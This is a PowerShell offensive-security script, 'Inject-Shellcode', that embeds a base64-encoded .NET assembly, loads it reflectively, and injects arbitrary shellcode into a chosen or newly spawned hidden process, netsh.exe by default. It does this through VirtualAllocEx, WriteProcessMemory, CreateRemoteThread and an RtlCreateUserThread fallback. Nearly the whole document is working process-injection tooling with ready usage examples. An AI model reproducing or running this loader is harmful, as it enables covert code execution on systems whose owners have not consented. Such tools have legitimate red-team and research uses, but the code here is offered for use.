﻿function Inject-Shellcode ([switch]$x86, [switch]$x64, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath)
{
<#
.SYNOPSIS
Inject-Shellcode

Author: @benpturner
 
.DESCRIPTION
Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte)

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessPath C:\Windows\System32\notepad.exe

#>

$p = "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CQBAAFoACQBEAF8ACQBIAGQACQBMAGkACQBQADIACQBUAG4ACQBYAHMACQBcAHgACQBgAH0ACABoAGQACABsAGkACABwAG4ACAB0AFAACAB4AFUACAB8AFoACACAAF8ACACEAHMACACIAHgALgALAPYALgATAP8ALgAbAB4BLgAjACcBLgArADMBLgAzADMBLgA7ADMBLgBDACcBLgBLADkBLgBTADMBLgBbADMBLgBjAFEBLgBrAHsBYwBzAGQAgwBzAGQAowBzAGQAMQCCACgEAQA1BAABAwD2BQEAAAEFAKMBAQAAAQcAEwYBAAABCQAFBgEAAAELAIAFAQAAAQ0AjAUBAAABDwD9AQEAAAERAL4BAQAAARMAiAEBAAABFQCWAQEABgEXAO0BAQBDARkAngUCAAABGwDJAQMABIAAAAEAAAAAAAAAAAAAAAAA5QUAAAIAAAAAAAAAAAAAABoAVAEAAAAAAwACAAQAAgAFAAIAAAAAAABrZXJuZWwzMgA8TW9kdWxlPgBFWEVDVVRFX1JFQUQAU1VTUEVORF9SRVNVTUUAVEVSTUlOQVRFAElNUEVSU09OQVRFAFBBR0VfUkVBRFdSSVRFAEVYRUNVVEVfUkVBRFdSSVRFAEVYRUNVVEUATUVNX1JFU0VSVkUAV1JJVEVfV0FUQ0gAUEhZU0lDQUwAU0VUX1RIUkVBRF9UT0tFTgBTRVRfSU5GT1JNQVRJT04AUVVFUllfSU5GT1JNQVRJT04ARElSRUNUX0lNUEVSU09OQVRJT04AVE9QX0RPV04ATEFSR0VfUEFHRVMATk9BQ0NFU1MAUFJPQ0VTU19BTExfQUNDRVNTAFJFU0VUAE1FTV9DT01NSVQAR0VUX0NPTlRFWFQAU0VUX0NPTlRFWFQAUkVBRE9OTFkARVhFQ1VURV9XUklURUNPUFkAdmFsdWVfXwBtc2NvcmxpYgBscFRocmVhZElkAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAQ2xpZW50SWQAU3VzcGVuZFRocmVhZABSZXN1bWVUaHJlYWQAQ3JlYXRlUmVtb3RlVGhyZWFkAGhUaHJlYWQAT3BlblRocmVhZABSdGxDcmVhdGVVc2VyVGhyZWFkAENyZWF0ZVN1c3BlbmRlZABHZXRNb2R1bGVIYW5kbGUAQ2xvc2VIYW5kbGUAYkluaGVyaXRIYW5kbGUAaE1vZHVsZQBwcm9jTmFtZQBscE1vZHVsZU5hbWUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAENvbW1pdHRlZFN0YWNrU2l6ZQBNYXhpbXVtU3RhY2tTaXplAGR3U3RhY2tTaXplAG5TaXplAGR3U2l6ZQBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNIRV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBMZW5ndGgAa2VybmVsMzIuZGxsAG50ZGxsLmRsbABJbmplY3QuZGxsAEZpbGwAU3lzdGVtAEVudW0AbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbgBwRGVzdGluYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscEJ1ZmZlcgBscFBhcmFtZXRlcgAuY3RvcgBUaHJlYWRTZWN1cml0eURlc2NyaXB0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAVGhyZWFkQWNjZXNzAGR3RGVzaXJlZEFjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBHZXRD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bgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA0D8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$dl  = [System.Convert]::FromBase64String($p)
$a = [System.Reflection.Assembly]::Load($dl)
$o = New-Object Inject
$pst = New-Object System.Diagnostics.ProcessStartInfo
$pst.UseShellExecute = $False
$pst.CreateNoWindow = $True
$pst.FileName = "C:\Windows\system32\netsh.exe"

if ($x86.IsPresent) {
    if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
        $pst.FileName = "C:\Windows\System32\netsh.exe"
    } else {
        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
    }
}
   
if ($ProcessPath) {
    $pst.FileName = "$ProcessPath"
} 
if ($ProcID){
    $Process = [System.Diagnostics.Process]::GetProcessById($ProcID)
} else {
    $Process = [System.Diagnostics.Process]::Start($pst)
}

[IntPtr]$phandle = [Inject]::OpenProcess([Inject]::PROCESS_ALL_ACCESS, $false, $Process.ID);
[IntPtr]$zz = 0x10000
[IntPtr]$x = 0
[IntPtr]$nul = 0
[IntPtr]$max = 0x70000000
while( $zz.ToInt32() -lt $max.ToInt32() )
{
    $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
    if( $x.ToInt32() -ne $nul.ToInt32() ){ break }
    $zz = [Int32]$zz + $Shellcode.Length
}
echo "VirtualAllocEx"
echo "[+] $x"
if( $x.ToInt32() -gt $nul.ToInt32() )
{
    $hg = [Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $hg, $Shellcode.Length)
    $s = [Inject]::WriteProcessMemory($phandle,[IntPtr]($x.ToInt32()),$hg, $Shellcode.Length,0)
    echo "WriteProcessMemory"
    echo "[+] $s"
    $e = [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)
    echo "CreateRemoteThread"
    echo "[+] $e"

    if ($e -eq 0) {
    $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    echo "[-] Failed using CreateRemoteThread"
    echo "[-] LastError: $Lasterror"  
    echo ""
    $TokenHandle = [IntPtr]::Zero
    $c = [Inject]::RtlCreateUserThread($phandle,0,0,0,0,0,[IntPtr]$x,0,[ref] $TokenHandle,0)    
    echo "RtlCreateUserThread"
    echo "[+] $c"
    }

    $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    echo "LastError: $Lasterror"    
}



}
